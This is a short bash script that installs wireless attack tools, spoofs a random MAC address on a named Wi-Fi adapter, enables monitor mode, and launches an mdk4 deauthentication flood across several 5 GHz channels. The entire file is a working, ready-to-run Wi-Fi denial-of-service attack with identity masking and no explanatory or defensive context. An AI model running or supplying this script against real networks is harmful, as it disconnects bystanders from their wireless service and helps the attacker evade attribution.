#!/bin/bash
sudo apt-get -y install macchanger aircrack-ng mdk4
sudo ip link set wlx488f4cf095d0 down
sudo macchanger -r wlx488f4cf095d0
sudo ip link set wlx488f4cf095d0 up
sudo airmon-ng start wlx488f4cf095d0
#sudo mdk4 wlan0mon d -c h -x
sudo mdk4 wlx488f4cf095d0 d -c 36,40,44,48,149,153,157,161 -x


